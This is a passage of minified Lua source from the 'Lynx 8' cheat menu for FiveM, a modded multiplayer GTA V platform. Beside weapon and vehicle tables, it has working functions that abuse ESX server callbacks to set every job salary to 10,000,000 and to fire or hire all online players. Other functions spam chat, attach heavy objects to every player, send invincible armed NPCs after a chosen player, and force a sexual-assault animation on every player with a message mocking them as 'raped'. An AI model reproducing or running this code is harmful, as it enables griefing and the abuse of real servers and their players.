Scope',id='COMPONENT_AT_SCOPE_MAX'},{name='~h~~r~> ~s~Nigt Vision Scope',id='COMPONENT_AT_SCOPE_NV'},{name='~h~~r~> ~s~Thermal Scope',id='COMPONENT_AT_SCOPE_THERMAL'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_SR_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_SR_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_SR_SUPP_03'},{name='~h~~r~> ~s~Squared Muzzle Brake',id='COMPONENT_AT_MUZZLE_08'},{name='~h~~r~> ~s~Bell-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_09'}}}},MarksmanRifle={id='weapon_marksmanrifle',name='~h~~r~> ~s~Marksman Rifle',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_MARKSMANRIFLE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_MARKSMANRIFLE_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},MarksmanRifleMkII={id='weapon_marksmanrifle_mk2',name='~h~~r~> ~s~Marksman Rifle Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Large Scope',id='COMPONENT_AT_SCOPE_MEDIUM_MK2'},{name='~h~~r~> ~s~Zoom Scope',id='COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_MRFL_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_MRFL_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'},{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP_02'}}}}},Heavy={RPG={id='weapon_rpg',name='~h~~r~> ~s~RPG',bInfAmmo=false,mods={}},GrenadeLauncher={id='weapon_grenadelauncher',name='~h~~r~> ~s~Grenade Launcher',bInfAmmo=false,mods={}},GrenadeLauncherSmoke={id='weapon_grenadelauncher_smoke',name='~h~~r~> ~s~Grenade Launcher Smoke',bInfAmmo=false,mods={}},Minigun={id='weapon_minigun',name='~h~~r~> ~s~Minigun',bInfAmmo=false,mods={}},FireworkLauncher={id='weapon_firework',name='~h~~r~> ~s~Firework Launcher',bInfAmmo=false,mods={}},Railgun={id='weapon_railgun',name='~h~~r~> ~s~Railgun',bInfAmmo=false,mods={}},HomingLauncher={id='weapon_hominglauncher',name='~h~~r~> ~s~Homing Launcher',bInfAmmo=false,mods={}},CompactGrenadeLauncher={id='weapon_compactlauncher',name='~h~~r~> ~s~Compact Grenade Launcher',bInfAmmo=false,mods={}},Widowmaker={id='weapon_rayminigun',name='~h~~r~> ~s~Widowmaker',bInfAmmo=false,mods={}}},Throwables={Grenade={id='weapon_grenade',name='~h~~r~> ~s~Grenade',bInfAmmo=false,mods={}},BZGas={id='weapon_bzgas',name='~h~~r~> ~s~BZ Gas',bInfAmmo=false,mods={}},MolotovCocktail={id='weapon_molotov',name='~h~~r~> ~s~Molotov Cocktail',bInfAmmo=false,mods={}},StickyBomb={id='weapon_stickybomb',name='~h~~r~> ~s~Sticky Bomb',bInfAmmo=false,mods={}},ProximityMines={id='weapon_proxmine',name='~h~~r~> ~s~Proximity Mines',bInfAmmo=false,mods={}},Snowballs={id='weapon_snowball',name='~h~~r~> ~s~Snowballs',bInfAmmo=false,mods={}},PipeBombs={id='weapon_pipebomb',name='~h~~r~> ~s~Pipe Bombs',bInfAmmo=false,mods={}},Baseball={id='weapon_ball',name='~h~~r~> ~s~Baseball',bInfAmmo=false,mods={}},TearGas={id='weapon_smokegrenade',name='~h~~r~> ~s~Tear Gas',bInfAmmo=false,mods={}},Flare={id='weapon_flare',name='~h~~r~> ~s~Flare',bInfAmmo=false,mods={}}},Misc={Parachute={id='gadget_parachute',name='~h~~r~> ~s~Parachute',bInfAmmo=false,mods={}},FireExtinguisher={id='weapon_fireextinguisher',name='~h~~r~> ~s~Fire Extinguisher',bInfAmmo=false,mods={}}}}local b7=false

local b8=false

local b9=false

local ba=false

local bb=nil

local bc={}local bd={}local be=nil

local bf=false

local bg=-1

local bh=-1

local bi=-1

local bj=false

local bk={{name='~h~Spoilers',id=0},{name='~h~Front Bumper',id=1},{name='~h~Rear Bumper',id=2},{name='~h~Side Skirt',id=3},{name='~h~Exhaust',id=4},{name='~h~Frame',id=5},{name='~h~Grille',id=6},{name='~h~Hood',id=7},{name='~h~Fender',id=8},{name='~h~Right Fender',id=9},{name='~h~Roof',id=10},{name='~h~Vanity Plates',id=25},{name='~h~Trim',id=27},{name='~h~Ornaments',id=28},{name='~h~Dashboard',id=29},{name='~h~Dial',id=30},{name='~h~Door Speaker',id=31},{name='~h~Seats',id=32},{name='~h~Steering Wheel',id=33},{name='~h~Shifter Leavers',id=34},{name='~h~Plaques',id=35},{name='~h~Speakers',id=36},{name='~h~Trunk',id=37},{name='~h~Hydraulics',id=38},{name='~h~Engine Block',id=39},{name='~h~Air Filter',id=40},{name='~h~Struts',id=41},{name='~h~Arch Cover',id=42},{name='~h~Aerials',id=43},{name='~h~Trim 2',id=44},{name='~h~Tank',id=45},{name='~h~Windows',id=46},{name='~h~Livery',id=48},{name='~h~Horns',id=14},{name='~h~Wheels',id=23},{name='~h~Wheel Types',id='wheeltypes'},{name='~h~Extras',id='extra'},{name='~h~Neons',id='neon'},{name='~h~Paint',id='paint'},{name='~h~Headlights Color',id='headlight'},{name='~h~Licence Plate',id='licence'}}local bl={{name='~h~~r~Engine',id=11},{name='~h~~b~Brakes',id=12},{name='~h~~g~Transmission',id=13},{name='~h~~y~Suspension',id=15},{name='~h~~b~Armor',id=16}}local bm={{name='~h~Blue on White 2',id=0},{name='~h~Blue on White 3',id=4},{name='~h~Yellow on Blue',id=2},{name='~h~Yellow on Black',id=1},{name='~h~North Yankton',id=5}}local bn={{name='~h~Default',id=-1},{name='~h~White',id=0},{name='~h~Blue',id=1},{name='~h~Electric Blue',id=2},{name='~h~Mint Green',id=3},{name='~h~Lime Green',id=4},{name='~h~Yellow',id=5},{name='~h~Golden Shower',id=6},{name='~h~Orange',id=7},{name='~h~Red',id=8},{name='~h~Pony Pink',id=9},{name='~h~Hot Pink',id=10},{name='~h~Purple',id=11},{name='~h~Blacklight',id=12}}local bo={['Stock Horn']=-1,['Truck Horn']=1,['Police Horn']=2,['Clown Horn']=3,['Musical Horn 1']=4,['Musical Horn 2']=5,['Musical Horn 3']=6,['Musical Horn 4']=7,['Musical Horn 5']=8,['Sad Trombone Horn']=9,['Classical Horn 1']=10,['Classical Horn 2']=11,['Classical Horn 3']=12,['Classical Horn 4']=13,['Classical Horn 5']=14,['Classical Horn 6']=15,['Classical Horn 7']=16,['Scaledo Horn']=17,['Scalere Horn']=18,['Salemi Horn']=19,['Scalefa Horn']=20,['Scalesol Horn']=21,['Scalela Horn']=22,['Scaleti Horn']=23,['Scaledo Horn High']=24,['Jazz Horn 1']=25,['Jazz Horn 2']=26,['Jazz Horn 3']=27,['Jazz Loop Horn']=28,['Starspangban Horn 1']=28,['Starspangban Horn 2']=29,['Starspangban Horn 3']=30,['Starspangban Horn 4']=31,['Classical Loop 1']=32,['Classical Horn 8']=33,['Classical Loop 2']=34}local bp={['White']={255,255,255},['Blue']={0,0,255},['Electric Blue']={0,150,255},['Mint Green']={50,255,155},['Lime Green']={0,255,0},['Yellow']={255,255,0},['Golden Shower']={204,204,0},['Orange']={255,128,0},['Red']={255,0,0},['Pony Pink']={255,102,255},['Hot Pink']={255,0,255},['Purple']={153,0,153}}local bq={{name='~h~Black',id=0},{name='~h~Carbon Black',id=147},{name='~h~Graphite',id=1},{name='~h~Anhracite Black',id=11},{name='~h~Black Steel',id=2},{name='~h~Dark Steel',id=3},{name='~h~Silver',id=4},{name='~h~Bluish Silver',id=5},{name='~h~Rolled Steel',id=6},{name='~h~Shadow Silver',id=7},{name='~h~Stone Silver',id=8},{name='~h~Midnight Silver',id=9},{name='~h~Cast Iron Silver',id=10},{name='~h~Red',id=27},{name='~h~Torino Red',id=28},{name='~h~Formula Red',id=29},{name='~h~Lava Red',id=150},{name='~h~Blaze Red',id=30},{name='~h~Grace Red',id=31},{name='~h~Garnet Red',id=32},{name='~h~Sunset Red',id=33},{name='~h~Cabernet Red',id=34},{name='~h~Wine Red',id=143},{name='~h~Candy Red',id=35},{name='~h~Hot Pink',id=135},{name='~h~Pfsiter Pink',id=137},{name='~h~Salmon Pink',id=136},{name='~h~Sunrise Orange',id=36},{name='~h~Orange',id=38},{name='~h~Bright Orange',id=138},{name='~h~Gold',id=99},{name='~h~Bronze',id=90},{name='~h~Yellow',id=88},{name='~h~Race Yellow',id=89},{name='~h~Dew Yellow',id=91},{name='~h~Dark Green',id=49},{name='~h~Racing Green',id=50},{name='~h~Sea Green',id=51},{name='~h~Olive Green',id=52},{name='~h~Bright Green',id=53},{name='~h~Gasoline Green',id=54},{name='~h~Lime Green',id=92},{name='~h~Midnight Blue',id=141},{name='~h~Galaxy Blue',id=61},{name='~h~Dark Blue',id=62},{name='~h~Saxon Blue',id=63},{name='~h~Blue',id=64},{name='~h~Mariner Blue',id=65},{name='~h~Harbor Blue',id=66},{name='~h~Diamond Blue',id=67},{name='~h~Surf Blue',id=68},{name='~h~Nautical Blue',id=69},{name='~h~Racing Blue',id=73},{name='~h~Ultra Blue',id=70},{name='~h~Light Blue',id=74},{name='~h~Chocolate Brown',id=96},{name='~h~Bison Brown',id=101},{name='~h~Creeen Brown',id=95},{name='~h~Feltzer Brown',id=94},{name='~h~Maple Brown',id=97},{name='~h~Beechwood Brown',id=103},{name='~h~Sienna Brown',id=104},{name='~h~Saddle Brown',id=98},{name='~h~Moss Brown',id=100},{name='~h~Woodbeech Brown',id=102},{name='~h~Straw Brown',id=99},{name='~h~Sandy Brown',id=105},{name='~h~Bleached Brown',id=106},{name='~h~Schafter Purple',id=71},{name='~h~Spinnaker Purple',id=72},{name='~h~Midnight Purple',id=142},{name='~h~Bright Purple',id=145},{name='~h~Cream',id=107},{name='~h~Ice White',id=111},{name='~h~Frost White',id=112}}local br='~u~Lynx ~s~Official'local bs={{name='~h~Black',id=12},{name='~h~Gray',id=13},{name='~h~Light Gray',id=14},{name='~h~Ice White',id=131},{name='~h~Blue',id=83},{name='~h~Dark Blue',id=82},{name='~h~Midnight Blue',id=84},{name='~h~Midnight Purple',id=149},{name='~h~Schafter Purple',id=148},{name='~h~Red',id=39},{name='~h~Dark Red',id=40},{name='~h~Orange',id=41},{name='~h~Yellow',id=42},{name='~h~Lime Green',id=55},{name='~h~Green',id=128},{name='~h~Forest Green',id=151},{name='~h~Foliage Green',id=155},{name='~h~Olive Darb',id=152},{name='~h~Dark Earth',id=153},{name='~h~Desert Tan',id=154}}local bt={{name='~h~Brushed Steel',id=117},{name='~h~Brushed Black Steel',id=118},{name='~h~Brushed Aluminum',id=119},{name='~h~Pure Gold',id=158},{name='~h~Brushed Gold',id=159}}defaultVehAction=''if GetVehiclePedIsUsing(PlayerPedId())then veh=GetVehiclePedIsUsing(PlayerPedId())end

local bu=false

local bv=true

local function by(G,x,y)SetTextFont(0)SetTextProportional(1)SetTextScale(0.0,0.4)SetTextDropshadow(1,0,0,0,255)SetTextEdge(1,0,0,0,255)SetTextDropShadow()SetTextOutline()SetTextEntry('STRING')AddTextComponentString(G)DrawText(x,y)end

function RequestModelSync(bz)local bA=GetHashKey(bz)RequestModel(bA)while not HasModelLoaded(bA)do RequestModel(bA)Citizen.Wait(0)end end

function EconomyDy2()if ESX then ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'police',0,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'mecano',0,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'ambulance',0,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'realestateagent',0,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'cardealer',0,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'police',1,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'mecano',1,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'ambulance',1,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'realestateagent',1,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'cardealer',1,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'police',2,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'mecano',2,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'ambulance',2,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'realestateagent',2,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'cardealer',2,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'police',3,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'mecano',3,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'ambulance',3,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'realestateagent',3,10000000)ESX.TriggerServerCallback('esx_society:setJobSalary',function()end,'cardealer',3,10000000)end end

function UnemployedPlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'unemployed',0,'fire')end end)end end

function AmbulancePlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'ambulance',3,'hire')end end)end end

function PolicePlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'police',4,'hire')end end)end end

local bB=0

capPa='d'..'o'..'k'..'i'cappA='d'..'o'..'k'..'i'..capPa

local bC=cappA

local function bD()if bB==3 then ForceSocialClubUpdate()else local aj=KeyboardInput('Get your password from #lynx-announcements','',100)if aj==bC then a=true

PlaySoundFrontend(-1,'PICK_UP','HUD_FRONTEND_DEFAULT_SOUNDSET',true)Citizen.Wait(100)PlaySoundFrontend(-1,'PICK_UP','HUD_FRONTEND_DEFAULT_SOUNDSET',true)Citizen.Wait(100)PlaySoundFrontend(-1,'PICK_UP','HUD_FRONTEND_DEFAULT_SOUNDSET',true)else bB=bB+1

PlaySoundFrontend(-1,'MP_WAVE_COMPLETE','HUD_FRONTEND_DEFAULT_SOUNDSET',true)end end end

function MecanoPlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'mecano',4,'hire')end end)end end

function RealEstateAgentPlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'realestateagent',4,'hire')end end)end end

function TaxiPlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'taxi',4,'hire')end end)end end

function CarDealerPlayers()if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

identifier=ar[i].identifier

ESX.TriggerServerCallback('esx_society:setJob',function()end,identifier,'cardealer',4,'hire')end end)end end

function UnemployedPlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'unemployed',0,'hire')end)end end

function CarDealerPlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'cardealer',3,'hire')end)end end

function RealEstateAgentPlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'realestateagent',3,'hire')end)end end

function TaxiPlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'taxi',3,'hire')end)end end

function AmbulancePlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'ambulance',3,'hire')end)end end

function PolicePlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'police',3,'hire')end)end end

function MecanoPlayer(bE)if ESX then ESX.TriggerServerCallback('esx_society:getOnlinePlayers',function(ar)local bF=nil

for i=1,#ar,1 do label=ar[i].name

value=ar[i].source

name=ar[i].name

if name==GetPlayerName(bE)then bF=ar[i].identifier

debugLog('found '..ar[i].name..' '..ar[i].identifier)end

identifier=ar[i].identifier end

ESX.TriggerServerCallback('esx_society:setJob',function()end,bF,'mecano',3,'hire')end)end end

function bananapartyall()Citizen.CreateThread(function()for bC=0,9 do TriggerServerEvent('_chat:messageEntered','^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',{141,211,255},'^'..bC..'Lynx 8 ~ www.lynxmenu.com')end

for i=0,128 do local bG=CreateObject(GetHashKey('p_crahsed_heli_s'),0,0,0,true,true,true)local bH=CreateObject(GetHashKey('prop_rock_4_big2'),0,0,0,true,true,true)local bI=CreateObject(GetHashKey('prop_beachflag_le'),0,0,0,true,true,true)AttachEntityToEntity(bG,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),57005),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)AttachEntityToEntity(bH,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),57005),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)AttachEntityToEntity(bI,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),57005),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)end end)end

function RespawnPed(ped,bJ,bK)SetEntityCoordsNoOffset(ped,bJ.x,bJ.y,bJ.z,false,false,false,true)NetworkResurrectLocalPlayer(bJ.x,bJ.y,bJ.z,bK,true,false)SetPlayerInvincible(ped,false)TriggerEvent('playerSpawned',bJ.x,bJ.y,bJ.z)ClearPedBloodDamage(ped)end

local function bL(ac)local bM=NetworkGetNetworkIdFromEntity(ped)local bN=0

NetworkRequestControlOfNetworkId(bM)while not NetworkHasControlOfNetworkId(bM)do Citizen.Wait(1)NetworkRequestControlOfNetworkId(bM)bN=bN+1

if bN==5000 then Citizen.Trace('Control failed')break end end end

local function bO(bP,bQ)for i=0,10 do local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))RequestModel(GetHashKey(bP))Citizen.Wait(50)if HasModelLoaded(GetHashKey(bP))then local ped=CreatePed(21,GetHashKey(bP),bJ.x+i,bJ.y-i,bJ.z,0,true,false)and CreatePed(21,GetHashKey(bP),bJ.x-i,bJ.y+i,bJ.z,0,true,false)if DoesEntityExist(ped)and not IsEntityDead(GetPlayerPed(SelectedPlayer))then bL(ped)GiveWeaponToPed(ped,GetHashKey(bQ),9999,1,1)SetEntityInvincible(ped,true)SetPedCanSwitchWeapon(ped,true)TaskCombatPed(ped,GetPlayerPed(SelectedPlayer),0,16)elseif IsEntityDead(GetPlayerPed(SelectedPlayer))then TaskCombatHatedTargetsInArea(ped,bJ.x,bJ.y,bJ.z,500)else Citizen.Wait(0)end end end end

function RapeAllFunc()for bC=0,9 do TriggerServerEvent('_chat:messageEntered','^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',{141,211,255},'^'..bC..'You got raped by Lynx 8')end

Citizen.CreateThread(function()for i=0,128 do RequestModelSync('a_m_o_acult_01')RequestAnimDict('rcmpaparazzo_2')while not HasAnimDictLoaded('rcmpaparazzo_2')do Citizen.Wait(0)end

if IsPedInAnyVehicle(GetPlayerPed(i),true)then local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)while not NetworkHasControlOfEntity(veh)do NetworkRequestControlOfEntity(veh)Citizen.Wait(0)end

SetEntityAsMissionEntity(veh,true,true)DeleteVehicle(veh)DeleteEntity(veh)end

count=-0.2

for b=1,3 do local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))local bR=CreatePed(4,GetHashKey('a_m_o_acult_01'),x,y,z,0.0,true,false)SetEntityAsMissionEntity(bR,true,true)AttachEntityToEntity(bR,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),'rcmpaparazzo_2','shag_loop_poppy',2.0,2.5,-1,49,0,0,0,0)SetPedKeepTask(bR)TaskPlayAnim(bR,'rcmpaparazzo_2','shag_loop_a',2.0,2.5,-1,49,0,0,0,0)SetEntityInvincible(bR,true)count=count-0.4 end end end)end

local function bS()local bT=KeyboardInput('Enter X pos','',100)local bU=KeyboardInput('Enter Y pos','',100)local bV=KeyboardInput('Enter Z pos','',100)if bT~=''and bU~=''and bV~=''then if IsPedInAnyVehicle(GetPlayerPed(-1),0)and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1)then entity=GetVehiclePedIsIn(GetPlayerPed(-1),0)else entity=GetPlayerPed(-1)end

if entity then SetEntityCoords(entity,bT+0.5,bU+0.5,bV+0.5,1,0,0,1)au('~g~Teleported to coords!',false)end else au('~b~Invalid coords!',true)end end

local function bW()local name=KeyboardInput('Enter Blip Name','',100)if name==''then au('~b~Invalid Blip Name!',true)return bW()else local bT=KeyboardInput('Enter X pos','',100)local bU=KeyboardInput('Enter Y pos','',100)local bV=KeyboardInput('Enter Z pos','',100)if bT~=''and bU~=''and bV~=''then local bX={{colour=75,id=84}}for _,bY in pairs(bX)do bY.blip=AddBlipForCoord(bT+0.5,bU+0.5,bV+0.5)SetBlipSprite(bY.blip,bY.id)SetBlipDisplay(bY.blip,4)SetBlipScale(bY.blip,0.9)SetBlipColour(bY.blip,bY.colour)SetBlipAsShortRange(bY.blip,true)BeginTextCommandSetBlipName('STRING')AddTextComponentString(name)EndTextCommandSetBlipName(bY.blip)end else au('~b~Invalid coords!',true)end end end

local function bZ()local aw=GetPlayerPed(-1)local b_=GetEntityCoords(aw,true)local c0=GetClosestVehicle(GetEntityCoords(aw,true),1000.0,0,4)local c1=GetEntityCoords(c0,true)local c2=GetClosestVehicle(GetEntityCoords(aw,true),1000.0,0,16384)local c3=GetEntityCoords(c2,true)au('~y~Wait...',false)Citizen.Wait(1000)if c0==0 and c2==0 then au('~b~No Vehicle Found',true)elseif c0==0 and c2~=0 then if IsVehicleSeatFree(c2,-1)then SetPedIntoVehicle(aw,c2,-1)SetVehicleAlarm(c2,false)SetVehicleDoorsLocked(c2,1)SetVehicleNeedsToBeHotwired(c2,false)else local c4=GetPedInVehicleSeat(c2,-1)ClearPedTasksImmediately(c4)SetEntityAsMissionEntity(c4,1,1)DeleteEntity(c4)SetPedIntoVehicle(aw,c2,-1)SetVehicleAlarm(c2,false)SetVehicleDoorsLocked(c2,1)SetVehicleNeedsToBeHotwired(c2,false)end

au('~g~Teleported Into Nearest Vehicle!',false)elseif c0~=0 and c2==0 then if IsVehicleSeatFree(c0,-1)then SetPedIntoVehicle(aw,c0,-1)SetVehicleAlarm(c0,false)SetVehicleDoorsLocked(c0,1)SetVehicleNeedsToBeHotwired(c0,false)else local c4=GetPedInVehicleSeat(c0,-1)ClearPedTasksImmediately(c4)SetEntityAsMissionEntity(c4,1,1)DeleteEntity(c4)SetPedIntoVehicle(aw,c0,-1)SetVehicleAlarm(c0,false)SetVehicleDoorsLocked(c0,1)SetVehicleNeedsToBeHotwired(c0,false)end

au('~g~Teleported Into Nearest Vehicle!',false)elseif c0~=0 and c2~=0 then if Vdist(c1.x,c1.y,c1.z,b_.x,b_.y,b_.z)<Vdist(c3.x,c3.y,c3.z,b_.x,b_.y,b_.z)then if IsVehicleSeatFree(c0,-1)then SetPedIntoVehicle(aw,c0,-1)SetVehicleAlarm(c0,false)SetVehicleDoorsLocked(c0,1)SetVehicleNeedsToBeHotwired(c0,false)else local c4=GetPedInVehicleSeat(c0,-1)ClearPedTasksImmediately(c4)SetEntityAsMissionEntity(c4,1,1)DeleteEntity(c4)SetPedIntoVehicle(aw,c0,-1)SetVehicleAlarm(c0,false)SetVehicleDoorsLocked(c0,1)SetVehicleNeedsToBeHotwired(c0,false)end elseif Vdist(c1.x,c1.y,c1.z,b_.x,b_.y,b_.z)>Vdist(c3.x,c3.y,c3.z,b_.x,b_.y,b_.z)then if IsVehicleSeatFree(c2,-1)then SetPedIntoVehicle(aw,c2,-1)SetVehicleAlarm(c2,false)SetVehicleDoorsLocked(c2,1)SetVehicleNeedsToBeHotwired(c2,false)else local c4=GetPedInVehicleSeat(c2,-1)ClearPedTasksImmediately(c4)SetEntityAsMissionEntity(c4,1,1)DeleteEntity(c4)SetPedIntoVehicle(aw,c2,-1)SetVehicleAlarm(c2,false)SetVehicleDoorsLocked(c2,1)SetVehicleNeedsToBeHotwired(c2,false)end end

au('~g~Teleported Into Nearest Vehicle!',false)end end

local function c5()if DoesBlipExist(GetFirstBlipInfoId(8))then local c6=GetBlipInfoIdIterator(8)local blip=GetFirstBlipInfoId(8,c6)WaypointCoords=Citizen.InvokeNative(0xFA7C7F0AADF25D09,blip,Citizen.ResultAsVector())wp=true else au('~b~No waypoint!',true)end

local c7=0.0

height=1000.0

